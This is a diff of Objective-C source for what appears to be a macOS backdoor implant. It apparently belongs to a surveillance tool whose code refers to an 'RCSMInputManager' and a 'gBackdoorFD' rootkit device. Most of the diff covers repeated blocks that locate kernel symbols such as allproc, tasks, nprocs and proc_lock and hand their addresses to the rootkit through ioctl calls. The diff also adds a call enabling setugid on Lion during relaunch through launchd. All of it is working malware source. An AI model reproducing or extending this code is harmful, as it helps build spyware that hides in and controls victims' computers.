@@ -2284,14 +2284,14 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
   
 #ifdef DEBUG_CORE
-  infoLog(@"Original info.plist for osax %@", info_orig_pl);
+  verboseLog(@"Original info.plist for osax %@", info_orig_pl);
 #endif
   
   NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
                                                               withString: gInputManagerName];
   
 #ifdef DEBUG_CORE
-  infoLog(@"info.plist for osax %@", info_pl);
+  verboseLog(@"info.plist for osax %@", info_pl);
 #endif
   
   NSString *infoPath = [NSString stringWithFormat:
@@ -2510,69 +2510,69 @@ static void computerWillShutdown(CFMachPortRef port,
       // thus we need to map the 64bit part
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, kmod_hash);
-      sym.hash   = kmod_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, kmod_hash);
+      sym.hash    = kmod_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, nsysent_hash);
-      sym.hash   = nsysent_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, nsysent_hash);
+      sym.hash    = nsysent_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, tasks_hash);
-      sym.hash   = tasks_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, tasks_hash);
+      sym.hash    = tasks_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, allproc_hash);
-      sym.hash   = allproc_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, allproc_hash);
+      sym.hash    = allproc_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, tasks_count_hash);
-      sym.hash   = tasks_count_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, tasks_count_hash);
+      sym.hash    = tasks_count_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, nprocs_hash);
-      sym.hash   = nprocs_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, nprocs_hash);
+      sym.hash    = nprocs_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
-      sym.hash   = tasks_threads_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, tasks_threads_lock_hash);
+      sym.hash    = tasks_threads_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, proc_lock_hash);
-      sym.hash   = proc_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, proc_lock_hash);
+      sym.hash    = proc_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
-      sym.hash   = proc_unlock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, proc_unlock_hash);
+      sym.hash    = proc_unlock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
-      sym.hash   = proc_list_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, proc_list_lock_hash);
+      sym.hash    = proc_list_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
-      sym.hash   = proc_list_unlock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary64(imageBase, proc_list_unlock_hash);
+      sym.hash    = proc_list_unlock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_64, &sym);
     }
   else
@@ -2584,69 +2584,69 @@ static void computerWillShutdown(CFMachPortRef port,
       unsigned int symAddress = 0;
       
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, kmod_hash);
-      sym.hash   = kmod_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, kmod_hash);
+      sym.hash    = kmod_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, nsysent_hash);
-      sym.hash   = nsysent_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, nsysent_hash);
+      sym.hash    = nsysent_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, tasks_hash);
-      sym.hash   = tasks_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, tasks_hash);
+      sym.hash    = tasks_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, allproc_hash);
-      sym.hash   = allproc_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, allproc_hash);
+      sym.hash    = allproc_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, tasks_count_hash);
-      sym.hash   = tasks_count_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, tasks_count_hash);
+      sym.hash    = tasks_count_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, nprocs_hash);
-      sym.hash   = nprocs_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, nprocs_hash);
+      sym.hash    = nprocs_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
-      sym.hash   = tasks_threads_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, tasks_threads_lock_hash);
+      sym.hash    = tasks_threads_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, proc_lock_hash);
-      sym.hash   = proc_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, proc_lock_hash);
+      sym.hash    = proc_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, proc_unlock_hash);
-      sym.hash   = proc_unlock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, proc_unlock_hash);
+      sym.hash    = proc_unlock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
-      sym.hash   = proc_list_lock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, proc_list_lock_hash);
+      sym.hash    = proc_list_lock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
 
       // Sending Symbol
-      symAddress = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
-      sym.hash   = proc_list_unlock_hash;
-      sym.symbol = symAddress;
+      symAddress  = findSymbolInFatBinary(imageBase, proc_list_unlock_hash);
+      sym.hash    = proc_list_unlock_hash;
+      sym.address = symAddress;
       ret = ioctl(gBackdoorFD, MCHOOK_SOLVE_SYM_32, &sym);
     }
   
@@ -3016,6 +3016,9 @@ static void computerWillShutdown(CFMachPortRef port,
               warnLog(@"mdworker.flg not found. Relaunching through launchd");
 #endif
               [gUtil dropExecFlag];
+            
+              // Enable setugid on lion
+              [gUtil enableSetugidAuth];
             }
         }
       else
